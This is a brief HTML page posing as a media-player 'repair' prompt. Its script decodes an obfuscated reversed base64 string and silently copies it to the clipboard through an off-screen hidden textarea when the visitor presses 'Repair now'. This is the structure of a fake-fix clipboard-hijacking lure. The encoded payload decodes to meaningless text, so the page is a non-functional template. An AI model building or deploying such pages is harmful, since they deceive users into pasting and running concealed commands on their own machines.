<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Player repair</title></head>
<body>
<div id="fix">Your media player is outdated. Press the button below to repair it.</div>
<textarea id="buf" style="margin:-9999px;" rows="1" cols="1"></textarea>
<button id="go">Repair now</button>
<script>
function rev(s){return s.split("").reverse().join("");}
var cmd = atob(rev("=QGbvlGdjVmc05WZyBXY"));
document.getElementById("go").addEventListener("click", function(){
	var b = document.getElementById("buf");
	b.value = cmd;
	b.select();
	document.execCommand("copy");
});
</script>
</body>
</html>
